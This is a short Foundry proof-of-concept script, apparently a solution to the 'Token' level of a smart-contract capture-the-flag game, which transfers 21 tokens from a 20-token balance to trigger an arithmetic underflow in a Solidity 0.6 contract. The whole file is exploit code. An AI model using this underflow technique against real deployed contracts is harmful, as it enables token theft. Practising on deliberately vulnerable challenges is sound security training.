// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Ilevel05.sol";

contract POC is Script {
    Token level5 = Token(0x64db54633180E5C63Ca63393324a8E0843dFa485);

    function run() external {
        vm.startBroadcast();
        
        console.log("Current balance is :", level5.balanceOf(msg.sender));
        level5.transfer(0xD6aE8250b8348C94847280928c79fb3b63cA453e, 21);
        console.log("New balance is :", level5.balanceOf(msg.sender));

        vm.stopBroadcast();
    }
}